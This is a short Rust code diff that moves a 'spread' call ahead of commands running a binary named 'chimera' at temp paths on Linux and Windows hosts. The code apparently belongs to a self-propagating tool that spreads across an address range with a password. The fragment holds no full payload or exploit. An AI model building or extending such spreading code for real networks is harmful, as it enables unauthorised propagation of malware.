@@ -89,6 +89,9 @@ async fn main() {
     let start_tio = std::time::Instant::now();
     let mut x = crate::net::spread::spreader::Spreader::new(range, password).await;
 
+
+    x.spread().await;
+
     let nix_cmd = format!("/tmp/chimera password");
     let win_cmd = format!("C:\\temp\\chimera.exe password");
 
@@ -99,9 +102,6 @@ async fn main() {
     ];
 
     futures::future::join_all(cmd_futures).await;
-
-    x.spread().await;
-
     
 
     let golden_node;
